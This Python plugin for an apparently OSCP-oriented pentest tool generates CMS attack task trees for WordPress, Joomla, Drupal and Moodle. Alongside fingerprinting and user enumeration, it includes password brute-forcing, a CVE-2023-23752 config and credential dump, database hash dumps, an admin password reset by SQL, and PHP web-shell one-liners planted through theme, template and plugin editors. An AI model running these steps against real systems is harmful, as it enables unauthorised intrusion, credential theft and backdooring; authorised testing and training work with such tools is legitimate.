"""
CMS (Content Management System) enumeration plugin

Generates tasks for CMS platform enumeration including:
- WordPress, Joomla, Drupal, Moodle detection and enumeration
- Version fingerprinting and vulnerability research
- User enumeration and credential attacks
- Configuration file discovery
- Plugin/theme/module enumeration
- Admin panel access and RCE techniques

Extracted from HackTricks:
- /pentesting-web/wordpress.md (OSCP-relevant techniques only)
- /pentesting-web/joomla.md
- /pentesting-web/drupal/README.md
- /pentesting-web/drupal/drupal-rce.md
- /pentesting-web/moodle.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class CMSPlugin(ServicePlugin):
    """CMS platform enumeration plugin (WordPress, Joomla, Drupal, Moodle)"""

    @property
    def name(self) -> str:
        return "cms"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8000, 8080, 8443]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'http-alt', 'ssl/http']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Detect CMS platforms (triggered by HTTP plugin)

        Note: This plugin is designed to be triggered manually or by
        HTTP plugin when CMS is detected in initial fingerprinting
        """
        service = port_info.get('service', '').lower()
        port = port_info.get('port')
        product = port_info.get('product', '').lower()

        # Detect HTTP services
        if any(svc in service for svc in self.service_names):
            return True

        # Check common HTTP ports
        if port in self.default_ports:
            return True

        # Detect CMS-specific indicators
        if any(cms in product for cms in ['wordpress', 'joomla', 'drupal', 'moodle']):
            return True

        return False


    def detect_from_finding(self, finding: Dict[str, Any], profile=None) -> int:
        """Detect any CMS (Joomla, Drupal, Magento, TYPO3, Concrete5)"""
        from ..core.constants import FindingTypes
        import logging
        logger = logging.getLogger(__name__)

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # High confidence - Specific CMS detected
        cms_types = [FindingTypes.CMS_DETECTED, FindingTypes.CMS_JOOMLA,
                     FindingTypes.CMS_DRUPAL, FindingTypes.CMS_MAGENTO,
                     FindingTypes.CMS_TYPO3, FindingTypes.CMS_CONCRETE5]
        if finding_type in cms_types:
            logger.info(f"CMS plugin activating: {finding_type} detected")
            return 95

        # Medium - CMS indicators in description
        cms_indicators = ['joomla', 'drupal', 'magento', 'typo3', 'concrete5',
                          'administrator/index.php', 'user/login', 'admin/login']
        if any(ind in description for ind in cms_indicators):
            logger.info(f"CMS plugin activating: Found indicator '{description[:50]}'")
            return 85

        return 0

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate CMS enumeration task tree"""
        version = service_info.get('version', '')
        is_https = port in [443, 8443] or 'https' in service_info.get('service', '').lower()
        protocol = 'https' if is_https else 'http'
        url = f"{protocol}://{target}:{port}"

        tasks = {
            'id': f'cms-enum-{port}',
            'name': f'CMS Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: CMS Detection / Fingerprinting
        tasks['children'].append({
            'id': f'cms-detect-{port}',
            'name': 'CMS Platform Detection',
            'type': 'parent',
            'children': [
                {
                    'id': f'cms-meta-check-{port}',
                    'name': 'Check Meta Tags (WordPress/Drupal/Joomla)',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {url} | grep -iE "(WordPress|Drupal|Joomla|Moodle|generator)"',
                        'description': 'Identify CMS from HTML meta tags',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '-s': 'Silent mode (no progress bar)',
                            'grep -iE': 'Case-insensitive extended regex search',
                            'generator': 'Common meta tag revealing CMS type/version'
                        },
                        'success_indicators': [
                            'Meta tag found: <meta name="generator" content="WordPress X.X">',
                            'Meta tag found: <meta name="generator" content="Joomla! - Open Source">',
                            'Meta tag found: <meta name="generator" content="Drupal X">'
                        ],
                        'failure_indicators': [
                            'No generator meta tag (may be removed for security)',
                            'Connection timeout',
                            'Empty response'
                        ],
                        'next_steps': [
                            'Identify CMS type and version',
                            'Run CMS-specific scanner (wpscan/droopescan/moodlescan)',
                            'Check for default files (README.txt, CHANGELOG.txt)',
                            'Research version-specific CVEs'
                        ],
                        'alternatives': [
                            f'whatweb {url} -v',
                            f'Browser: View page source and search for "generator"',
                            f'curl -I {url} | grep -i "X-Powered-By"'
                        ],
                        'notes': 'Many sites remove generator tags. Check multiple indicators.'
                    }
                },
                {
                    'id': f'cms-readme-check-{port}',
                    'name': 'Check Default Files (README.txt, license.txt, CHANGELOG.txt)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'wp-license-{port}',
                            'name': 'WordPress: license.txt',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -s {url}/license.txt | head -20',
                                'description': 'Check WordPress license file (contains version info)',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'success_indicators': ['WordPress version mentioned'],
                                'alternatives': [f'curl -s {url}/readme.html | grep "Version"']
                            }
                        },
                        {
                            'id': f'joomla-readme-{port}',
                            'name': 'Joomla: README.txt',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -s {url}/README.txt | head -20',
                                'description': 'Check Joomla README (version and install path)',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'success_indicators': ['Joomla version mentioned', 'Installation path revealed']
                            }
                        },
                        {
                            'id': f'drupal-changelog-{port}',
                            'name': 'Drupal: CHANGELOG.txt',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -s {url}/CHANGELOG.txt | head -5',
                                'description': 'Check Drupal changelog (precise version)',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'success_indicators': ['Drupal X.XX, YYYY-MM-DD'],
                                'notes': 'Newer Drupal blocks access to CHANGELOG.txt by default'
                            }
                        },
                        {
                            'id': f'moodle-readme-{port}',
                            'name': 'Moodle: README.txt',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -s {url}/README.txt | head -20',
                                'description': 'Check Moodle README file',
                                'tags': ['OSCP:MEDIUM', 'QUICK_WIN']
                            }
                        }
                    ]
                },
                {
                    'id': f'cms-robots-{port}',
                    'name': 'Check robots.txt (Reveals CMS paths)',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {url}/robots.txt',
                        'description': 'Discover CMS-specific paths from robots.txt',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            'robots.txt': 'File instructing search engines which paths to avoid (reveals structure)'
                        },
                        'success_indicators': [
                            'Disallow: /wp-admin/ (WordPress)',
                            'Disallow: /administrator/ (Joomla)',
                            'Disallow: /user/login (Drupal)',
                            'Disallow: /admin/ (Moodle)'
                        ],
                        'next_steps': [
                            'Visit disallowed paths manually',
                            'Add discovered paths to wordlist for brute-forcing'
                        ],
                        'alternatives': [f'Browser: Navigate to {url}/robots.txt']
                    }
                }
            ]
        })

        # TASK 2: WordPress Enumeration (OSCP-focused only)
        tasks['children'].append({
            'id': f'wordpress-enum-{port}',
            'name': 'WordPress Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'wpscan-{port}',
                    'name': 'WPScan - WordPress Scanner',
                    'type': 'command',
                    'metadata': {
                        'command': f'wpscan --url {url} --enumerate u,vp,vt --api-token <API_TOKEN> -o wpscan_{port}.txt',
                        'description': 'Comprehensive WordPress vulnerability scanner',
                        'tags': ['OSCP:HIGH', 'AUTOMATED'],
                        'flag_explanations': {
                            '--url': 'Target WordPress URL',
                            '--enumerate u': 'Enumerate usernames',
                            '--enumerate vp': 'Enumerate vulnerable plugins',
                            '--enumerate vt': 'Enumerate vulnerable themes',
                            '--api-token': 'WPVulnDB API token (free with signup at wpscan.com)',
                            '-o': 'Output file for documentation'
                        },
                        'success_indicators': [
                            'WordPress version detected',
                            'Usernames enumerated',
                            'Vulnerable plugins/themes found',
                            'Known CVEs identified'
                        ],
                        'failure_indicators': [
                            'Not a WordPress site',
                            'WAF blocking requests',
                            'XML-RPC disabled (affects user enum)'
                        ],
                        'next_steps': [
                            'Research identified vulnerabilities (searchsploit)',
                            'Test default credentials on found usernames',
                            'Check /wp-content/uploads/ for sensitive files',
                            'Attempt login at /wp-admin/ or /wp-login.php'
                        ],
                        'alternatives': [
                            'droopescan scan wordpress -u ' + url,
                            'Manual user enum: curl -I ' + url + '/?author=1',
                            'Manual plugin enum: curl ' + url + '/wp-content/plugins/'
                        ],
                        'notes': 'WPScan free tier: 25 API requests/day. Sign up at wpscan.com',
                        'estimated_time': '5-10 minutes'
                    }
                },
                {
                    'id': f'wp-user-enum-{port}',
                    'name': 'WordPress User Enumeration (Manual)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'wp-author-enum-{port}',
                            'name': 'User Enum via ?author=N',
                            'type': 'command',
                            'metadata': {
                                'command': f'for i in {{1..10}}; do curl -s -I {url}/?author=$i | grep -E "HTTP|Location"; done',
                                'description': 'Enumerate users by ID brute-forcing',
                                'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                                'flag_explanations': {
                                    '?author=N': 'WordPress parameter to access author archive by user ID',
                                    '-I': 'Fetch headers only (faster)',
                                    'Location': 'Redirect header reveals username'
                                },
                                'success_indicators': [
                                    'HTTP 301/302 redirect to /author/username/',
                                    'Valid user IDs return 200 or redirect',
                                    'Invalid IDs return 404'
                                ],
                                'alternatives': [
                                    f'curl {url}/wp-json/wp/v2/users',
                                    f'curl {url}/wp-json/oembed/1.0/embed?url={url}',
                                    'Check /wp-login.php error messages (username enumeration)'
                                ],
                                'notes': 'Usernames often match admin, administrator, or site name'
                            }
                        },
                        {
                            'id': f'wp-json-users-{port}',
                            'name': 'User Enum via wp-json API',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -s {url}/wp-json/wp/v2/users | python3 -m json.tool',
                                'description': 'Enumerate users via WordPress REST API',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'success_indicators': [
                                    'JSON array with user objects',
                                    'Usernames, IDs, and slugs revealed'
                                ],
                                'failure_indicators': [
                                    'REST API disabled',
                                    'User endpoint restricted'
                                ],
                                'notes': 'Only shows users who have published content'
                            }
                        }
                    ]
                },
                {
                    'id': f'wp-xmlrpc-{port}',
                    'name': 'WordPress XML-RPC Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'wp-xmlrpc-check-{port}',
                            'name': 'Check XML-RPC Enabled',
                            'type': 'command',
                            'metadata': {
                                'command': f'''curl -X POST -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' {url}/xmlrpc.php''',
                                'description': 'Test if XML-RPC is enabled and list available methods',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'success_indicators': [
                                    'XML response with list of methods',
                                    'Methods include: wp.getUsersBlogs, pingback.ping'
                                ],
                                'failure_indicators': [
                                    'XML-RPC disabled (404 or blank response)',
                                    'XML-RPC services are disabled'
                                ],
                                'next_steps': [
                                    'Brute-force credentials using wp.getUsersBlogs',
                                    'Use pingback.ping for SSRF/port scanning',
                                    'Bypass 2FA if credentials known'
                                ],
                                'notes': 'XML-RPC legacy feature, often enabled, no 2FA support'
                            }
                        },
                        {
                            'id': f'wp-xmlrpc-brute-{port}',
                            'name': 'XML-RPC Credential Brute-force',
                            'type': 'command',
                            'metadata': {
                                'command': 'wpscan --url ' + url + ' --passwords /usr/share/wordlists/rockyou.txt --usernames admin,administrator',
                                'description': 'Brute-force WordPress credentials via XML-RPC',
                                'tags': ['OSCP:MEDIUM', 'NOISY'],
                                'flag_explanations': {
                                    '--passwords': 'Password wordlist',
                                    '--usernames': 'Target usernames from enumeration'
                                },
                                'success_indicators': [
                                    'Valid credentials found',
                                    '[SUCCESS] - admin / password'
                                ],
                                'alternatives': [
                                    'Manual XML-RPC POST with <methodName>wp.getUsersBlogs</methodName>',
                                    'hydra -L users.txt -P passwords.txt ' + url + ' http-post-form'
                                ],
                                'notes': 'XML-RPC allows bypassing 2FA. Noisy attack, use carefully.',
                                'estimated_time': '15-60 minutes depending on wordlist'
                            }
                        }
                    ]
                },
                {
                    'id': f'wp-config-{port}',
                    'name': 'WordPress Configuration File Discovery',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Post-exploitation: Find wp-config.php with database credentials',
                        'tags': ['OSCP:HIGH', 'POST_EXPLOIT'],
                        'alternatives': [
                            'find / -name wp-config.php 2>/dev/null',
                            'grep -r "DB_PASSWORD" /var/www/html/ 2>/dev/null',
                            'Common locations: /var/www/html/wp-config.php, ./wp-config.php'
                        ],
                        'next_steps': [
                            'Extract DB credentials',
                            'Connect to MySQL: mysql -u username -p database',
                            'Dump users: SELECT user_login,user_pass FROM wp_users;',
                            'Change admin password: UPDATE wp_users SET user_pass=MD5("hacked") WHERE ID=1;'
                        ],
                        'notes': 'wp-config.php contains DB credentials, salt keys, and debug settings'
                    }
                }
            ]
        })

        # TASK 3: Joomla Enumeration
        tasks['children'].append({
            'id': f'joomla-enum-{port}',
            'name': 'Joomla Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'joomscan-{port}',
                    'name': 'JoomScan / droopescan',
                    'type': 'command',
                    'metadata': {
                        'command': f'droopescan scan joomla --url {url} -t 32',
                        'description': 'Automated Joomla vulnerability scanner',
                        'tags': ['OSCP:HIGH', 'AUTOMATED'],
                        'flag_explanations': {
                            'scan joomla': 'Joomla scanning mode',
                            '--url': 'Target Joomla site',
                            '-t 32': 'Use 32 threads (faster scanning)'
                        },
                        'success_indicators': [
                            'Joomla version detected',
                            'Plugins/components found',
                            'Version files discovered'
                        ],
                        'failure_indicators': [
                            'Not a Joomla site',
                            'Access denied to version files'
                        ],
                        'next_steps': [
                            'Research version for CVEs (searchsploit Joomla X.X)',
                            'Check API endpoints for info disclosure (CVE-2023-23752)',
                            'Test default admin credentials at /administrator/'
                        ],
                        'alternatives': [
                            'joomscan -u ' + url,
                            'Manual: curl ' + url + '/administrator/manifests/files/joomla.xml',
                            'Manual: curl ' + url + '/language/en-GB/en-GB.xml | grep version'
                        ],
                        'estimated_time': '3-5 minutes'
                    }
                },
                {
                    'id': f'joomla-version-{port}',
                    'name': 'Joomla Version Detection (Manual)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'joomla-xml-{port}',
                            'name': 'Check joomla.xml',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -s {url}/administrator/manifests/files/joomla.xml | grep -i version',
                                'description': 'Extract Joomla version from XML manifest',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'success_indicators': ['<version>X.X.X</version>']
                            }
                        },
                        {
                            'id': f'joomla-lang-{port}',
                            'name': 'Check language file',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -s {url}/language/en-GB/en-GB.xml | grep -i version',
                                'description': 'Extract version from language XML',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN']
                            }
                        }
                    ]
                },
                {
                    'id': f'joomla-api-cve-{port}',
                    'name': 'Joomla API Info Disclosure (CVE-2023-23752)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'joomla-api-users-{port}',
                            'name': 'Enumerate Users via API',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -s {url}/api/v1/users?public=true',
                                'description': 'Exploit CVE-2023-23752: Unauthenticated user enumeration',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'EXPLOIT'],
                                'flag_explanations': {
                                    '/api/v1/users': 'Joomla API users endpoint',
                                    '?public=true': 'Bypass authentication (vulnerable versions)'
                                },
                                'success_indicators': [
                                    'JSON response with user data',
                                    'Usernames, emails, IDs revealed'
                                ],
                                'failure_indicators': [
                                    '403 Forbidden (patched)',
                                    '404 Not Found (old version or API disabled)'
                                ],
                                'notes': 'Affects Joomla 4.0.0 to 4.2.7. Patched in 4.2.8+',
                                'alternatives': ['Use Metasploit: scanner/http/joomla_api_improper_access_checks']
                            }
                        },
                        {
                            'id': f'joomla-api-config-{port}',
                            'name': 'Dump Config via API',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -s {url}/api/index.php/v1/config/application?public=true',
                                'description': 'Exploit CVE-2023-23752: Dump configuration including DB creds',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'EXPLOIT'],
                                'success_indicators': [
                                    'JSON response with config data',
                                    'Database credentials visible',
                                    'Secret keys exposed'
                                ],
                                'notes': 'Critical vuln - immediate database access if successful'
                            }
                        }
                    ]
                },
                {
                    'id': f'joomla-brute-{port}',
                    'name': 'Joomla Brute-force Login',
                    'type': 'command',
                    'metadata': {
                        'command': 'python3 joomla-brute.py -u ' + url + ' -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin',
                        'description': 'Brute-force Joomla administrator login',
                        'tags': ['OSCP:MEDIUM', 'NOISY'],
                        'flag_explanations': {
                            '-u': 'Target Joomla URL',
                            '-w': 'Password wordlist',
                            '-usr': 'Target username (from enumeration)'
                        },
                        'success_indicators': [
                            'Valid credentials found: admin:password',
                            'Login successful'
                        ],
                        'alternatives': [
                            'hydra -l admin -P passwords.txt ' + url + ' http-post-form',
                            'Manual: Test default credentials at /administrator/',
                            'wpscan brute-force method (adapted for Joomla)'
                        ],
                        'notes': 'Default path: /administrator/. Tool: https://github.com/ajnik/joomla-bruteforce',
                        'estimated_time': '10-30 minutes'
                    }
                }
            ]
        })

        # TASK 4: Drupal Enumeration
        tasks['children'].append({
            'id': f'drupal-enum-{port}',
            'name': 'Drupal Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'droopescan-drupal-{port}',
                    'name': 'Droopescan - Drupal Scanner',
                    'type': 'command',
                    'metadata': {
                        'command': f'droopescan scan drupal -u {url} -t 32',
                        'description': 'Automated Drupal vulnerability scanner',
                        'tags': ['OSCP:HIGH', 'AUTOMATED'],
                        'flag_explanations': {
                            'scan drupal': 'Drupal scanning mode',
                            '-u': 'Target URL',
                            '-t 32': 'Thread count (speed)'
                        },
                        'success_indicators': [
                            'Drupal version detected',
                            'Modules enumerated',
                            'Interesting URLs found'
                        ],
                        'next_steps': [
                            'Research version for Drupalgeddon exploits',
                            'Check /node/1, /node/2 for content enumeration',
                            'Test user registration and password reset'
                        ],
                        'alternatives': [
                            'Manual: curl ' + url + '/CHANGELOG.txt | head',
                            'Manual: curl ' + url + '/node/1'
                        ],
                        'estimated_time': '3-5 minutes'
                    }
                },
                {
                    'id': f'drupal-user-enum-{port}',
                    'name': 'Drupal User Enumeration',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'drupal-node-enum-{port}',
                            'name': 'User Enum via /node/N',
                            'type': 'command',
                            'metadata': {
                                'command': f'for i in {{1..10}}; do curl -s {url}/node/$i | grep -i "submitted by" | head -1; done',
                                'description': 'Enumerate users from node pages (blog posts)',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                                'flag_explanations': {
                                    '/node/N': 'Drupal content nodes (N = 1, 2, 3...)',
                                    'submitted by': 'Common text revealing content author'
                                },
                                'success_indicators': [
                                    'Usernames revealed in "Submitted by username"',
                                    'Valid nodes return 200, invalid return 404'
                                ],
                                'notes': 'Drupal nodes index all content. Start from /node/1'
                            }
                        },
                        {
                            'id': f'drupal-register-enum-{port}',
                            'name': 'User Enum via Registration',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Enumerate usernames via user registration form',
                                'tags': ['OSCP:HIGH', 'MANUAL'],
                                'alternatives': [
                                    f'Navigate to {url}/user/register',
                                    'Try to register existing usernames',
                                    'Error message reveals if username exists'
                                ],
                                'notes': 'If registration enabled, error messages leak existing usernames'
                            }
                        },
                        {
                            'id': f'drupal-password-reset-{port}',
                            'name': 'User Enum via Password Reset',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Enumerate valid usernames via password reset',
                                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                                'alternatives': [
                                    f'Navigate to {url}/user/password',
                                    'Submit password reset for username',
                                    'Different error messages for valid/invalid users'
                                ]
                            }
                        }
                    ]
                },
                {
                    'id': f'drupal-modules-{port}',
                    'name': 'Drupal Modules Enumeration',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {url}/config/sync/core.extension.yml',
                        'description': 'Enumerate installed Drupal modules from config',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN'],
                        'success_indicators': [
                            'YAML file with module list',
                            'Module names and versions'
                        ],
                        'failure_indicators': [
                            '403 Forbidden',
                            'Config sync disabled'
                        ],
                        'alternatives': [
                            f'curl -s {url}/core/core.services.yml',
                            f'curl -s {url}/config/sync/swiftmailer.transport.yml'
                        ],
                        'notes': 'From Twitter: @intigriti/status/1439192489093644292'
                    }
                },
                {
                    'id': f'drupal-post-exploit-{port}',
                    'name': 'Drupal Post-Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Post-compromise: Extract database credentials from settings.php',
                        'tags': ['OSCP:HIGH', 'POST_EXPLOIT'],
                        'alternatives': [
                            'find / -name settings.php 2>/dev/null',
                            '''grep -E "drupal_hash_salt|'database'|'username'|'password'" /path/to/settings.php''',
                            'mysql -u drupaluser -p drupal'
                        ],
                        'next_steps': [
                            'Connect to database with found credentials',
                            'Dump users: mysql -u USER -p -e "use drupal; select * from users"',
                            'Hash type: Drupal 7 uses SHA-512, Drupal 8+ uses bcrypt'
                        ],
                        'notes': 'settings.php typically in /var/www/html/sites/default/settings.php'
                    }
                }
            ]
        })

        # TASK 5: Moodle Enumeration
        tasks['children'].append({
            'id': f'moodle-enum-{port}',
            'name': 'Moodle Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'moodlescan-{port}',
                    'name': 'MoodleScan',
                    'type': 'command',
                    'metadata': {
                        'command': f'python3 moodlescan.py -k -u {url}',
                        'description': 'Moodle vulnerability scanner',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED'],
                        'flag_explanations': {
                            '-k': 'Skip SSL certificate verification',
                            '-u': 'Target Moodle URL'
                        },
                        'success_indicators': [
                            'Moodle version detected',
                            'Server information (Apache, PHP version)',
                            'Vulnerabilities found'
                        ],
                        'notes': 'Install: git clone https://github.com/inc0d3/moodlescan',
                        'estimated_time': '2-4 minutes'
                    }
                },
                {
                    'id': f'droopescan-moodle-{port}',
                    'name': 'Droopescan - Moodle Scanner',
                    'type': 'command',
                    'metadata': {
                        'command': f'droopescan scan moodle -u {url}',
                        'description': 'Alternative Moodle scanner',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED'],
                        'success_indicators': [
                            'Moodle version detected',
                            'Plugins enumerated',
                            'Admin panel located'
                        ],
                        'alternatives': [
                            'cmsmap ' + url,
                            'Manual: curl ' + url + '/README.txt'
                        ]
                    }
                },
                {
                    'id': f'moodle-cve-research-{port}',
                    'name': 'Moodle CVE Research',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Research Moodle version vulnerabilities',
                        'tags': ['OSCP:HIGH', 'RESEARCH'],
                        'alternatives': [
                            'Check https://snyk.io/vuln/composer:moodle%2Fmoodle',
                            'searchsploit moodle <version>',
                            'Research CVE-2020-14321 (privilege escalation)'
                        ],
                        'notes': 'Automatic tools often miss Moodle CVEs. Manual research critical.'
                    }
                },
                {
                    'id': f'moodle-post-exploit-{port}',
                    'name': 'Moodle Post-Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Post-compromise: Extract Moodle database credentials',
                        'tags': ['OSCP:HIGH', 'POST_EXPLOIT'],
                        'alternatives': [
                            'find / -name config.php -path "*/moodle/*" 2>/dev/null',
                            'grep -E "dbname|dbuser|dbpass" /path/to/moodle/config.php'
                        ],
                        'next_steps': [
                            'Connect to database',
                            '/usr/local/bin/mysql -u <user> -p<pass> -e "use moodle; select email,username,password from mdl_user"',
                            'Crack hashes offline (bcrypt)'
                        ],
                        'notes': 'Moodle stores user passwords as bcrypt hashes in mdl_user table'
                    }
                }
            ]
        })

        # TASK 6: CMS RCE Techniques (Admin Access Required)
        tasks['children'].append({
            'id': f'cms-rce-{port}',
            'name': 'CMS RCE Techniques (Admin Required)',
            'type': 'parent',
            'children': [
                {
                    'id': f'wp-rce-theme-{port}',
                    'name': 'WordPress RCE via Theme Editor',
                    'type': 'manual',
                    'metadata': {
                        'description': 'RCE by editing PHP theme files (admin creds needed)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'alternatives': [
                            'Login to /wp-admin/',
                            'Navigate: Appearance → Theme Editor → 404.php',
                            'Add PHP backdoor: <?php system($_GET["cmd"]); ?>',
                            'Access: ' + url + '/wp-content/themes/twentytwelve/404.php?cmd=id'
                        ],
                        'next_steps': [
                            'Establish reverse shell',
                            'Escalate privileges',
                            'Dump wp-config.php for database access'
                        ],
                        'notes': 'Common themes: twentytwelve, twentynineteen, twentytwenty'
                    }
                },
                {
                    'id': f'joomla-rce-template-{port}',
                    'name': 'Joomla RCE via Template Edit',
                    'type': 'manual',
                    'metadata': {
                        'description': 'RCE by customizing Joomla templates (admin needed)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'alternatives': [
                            'Login to /administrator/',
                            'Navigate: Templates → Protostar → error.php',
                            'Add: <?php system($_GET["cmd"]); ?>',
                            'Save & Close',
                            'Access: ' + url + '/templates/protostar/error.php?cmd=id'
                        ],
                        'notes': 'Alternative templates: beez3, protostar (older Joomla)'
                    }
                },
                {
                    'id': f'drupal-rce-php-filter-{port}',
                    'name': 'Drupal RCE via PHP Filter Module',
                    'type': 'manual',
                    'metadata': {
                        'description': 'RCE using PHP Filter module (Drupal <8 default, 8+ manual install)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MANUAL'],
                        'alternatives': [
                            'Check /modules/php for 403 (installed)',
                            'If not: Modules → Enable "PHP Filter" → Save',
                            'Add Content → Basic Page/Article',
                            'Text format: PHP code',
                            'Write: <?php system($_GET["cmd"]); ?>',
                            'Preview and access /node/N?cmd=id'
                        ],
                        'notes': 'Drupal 8+ requires manual PHP filter installation. Not default.'
                    }
                },
                {
                    'id': f'moodle-rce-plugin-{port}',
                    'name': 'Moodle RCE via Malicious Plugin',
                    'type': 'manual',
                    'metadata': {
                        'description': 'RCE by uploading backdoored plugin (Manager role needed)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                        'alternatives': [
                            'Login as Manager',
                            'Site Administration → Install Plugin',
                            'Upload malicious plugin (e.g., Moodle_RCE from GitHub)',
                            'Access: ' + url + '/blocks/rce/lang/en/block_rce.php?cmd=id'
                        ],
                        'notes': 'Plugin upload requires Manager role. Check CVE-2020-14321 for privesc.',
                        'next_steps': [
                            'Download plugin: https://github.com/HoangKien1020/Moodle_RCE',
                            'Modify IP/port for reverse shell',
                            'Upload and activate'
                        ]
                    }
                }
            ]
        })

        # TASK 7: Exploit Research (conditional on version detection)
        if version:
            tasks['children'].append({
                'id': f'cms-exploit-research-{port}',
                'name': f'Exploit Research for {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'searchsploit-cms-{port}',
                        'name': f'SearchSploit: {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit {version}',
                            'description': 'Search ExploitDB for CMS version exploits',
                            'tags': ['OSCP:HIGH', 'RESEARCH'],
                            'success_indicators': [
                                'Exploits found for this version',
                                'Local/Remote code execution available'
                            ],
                            'next_steps': [
                                'Read exploit code: searchsploit -x <exploit-id>',
                                'Copy to working directory: searchsploit -m <exploit-id>',
                                'Test exploit in controlled environment'
                            ]
                        }
                    },
                    {
                        'id': f'drupalgeddon-check-{port}',
                        'name': 'Check for Drupalgeddon (Drupal 7.x/8.x RCE)',
                        'type': 'manual',
                        'metadata': {
                            'description': 'Research critical Drupal RCE vulnerabilities',
                            'tags': ['OSCP:HIGH', 'RESEARCH'],
                            'alternatives': [
                                'Drupalgeddon 1: CVE-2014-3704 (SQL injection → RCE)',
                                'Drupalgeddon 2: CVE-2018-7600 (RCE, Drupal < 7.58 / < 8.5.1)',
                                'Drupalgeddon 3: CVE-2018-7602 (RCE, Drupal < 7.59 / < 8.5.3)',
                                'Metasploit: use exploit/unix/webapp/drupal_drupalgeddon2'
                            ],
                            'notes': 'Drupalgeddon 2 extremely common on older Drupal installs (pre-2018)'
                        }
                    }
                ]
            })

        return tasks

    def on_task_complete(self, task_id: str, result: str, target: str) -> List[Dict[str, Any]]:
        """Parse CMS detection results and spawn specific enumeration tasks"""
        new_tasks = []
        port = task_id.split('-')[-1]

        # If CMS detected in meta check, add specific scanner
        if 'cms-meta-check' in task_id:
            if 'wordpress' in result.lower():
                new_tasks.append({
                    'id': f'wpscan-focused-{port}',
                    'name': 'WordPress Detected: Run WPScan',
                    'type': 'command',
                    'metadata': {
                        'command': f'wpscan --url http://{target}:{port} --enumerate vp,vt,u',
                        'description': 'WordPress detected - running focused scan',
                        'tags': ['OSCP:HIGH', 'AUTOMATED']
                    }
                })

            if 'joomla' in result.lower():
                new_tasks.append({
                    'id': f'joomscan-focused-{port}',
                    'name': 'Joomla Detected: Run Droopescan',
                    'type': 'command',
                    'metadata': {
                        'command': f'droopescan scan joomla --url http://{target}:{port}',
                        'description': 'Joomla detected - running focused scan',
                        'tags': ['OSCP:HIGH', 'AUTOMATED']
                    }
                })

            if 'drupal' in result.lower():
                new_tasks.append({
                    'id': f'drupal-focused-{port}',
                    'name': 'Drupal Detected: Run Droopescan',
                    'type': 'command',
                    'metadata': {
                        'command': f'droopescan scan drupal -u http://{target}:{port}',
                        'description': 'Drupal detected - running focused scan',
                        'tags': ['OSCP:HIGH', 'AUTOMATED']
                    }
                })

            if 'moodle' in result.lower():
                new_tasks.append({
                    'id': f'moodle-focused-{port}',
                    'name': 'Moodle Detected: Run MoodleScan',
                    'type': 'command',
                    'metadata': {
                        'command': f'python3 moodlescan.py -u http://{target}:{port}',
                        'description': 'Moodle detected - running focused scan',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED']
                    }
                })

        return new_tasks

